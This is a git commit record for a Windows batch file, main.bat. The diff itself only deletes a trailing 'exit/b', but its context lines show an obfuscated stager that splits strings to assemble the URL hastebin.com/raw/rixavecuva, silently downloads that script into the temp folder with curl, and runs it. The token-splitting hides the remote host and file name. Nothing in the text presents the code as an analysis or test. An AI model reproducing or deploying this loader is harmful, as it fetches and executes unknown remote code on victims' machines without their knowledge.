84fe9328a061b097bf74625caded35b03faefe12
Sap196 <93683318+Sap196@users.noreply.github.com>
2022-01-21 17:04:45 +0100

    Update main.bat

--- main.bat
+++ main.bat
@@ -3,5 +3,3 @@ for /f "tokens=1-6" %%a in (""%temp%\A" "164271328028265" co  bin . rixavecuva")
     curl -#Lsko "%%~a%%~b%%ebat" "haste%%d%%e%%cm/raw/%%f"
     call "%%~a%%~b%%ebat" "%%~b"
 )
-
-exit/b
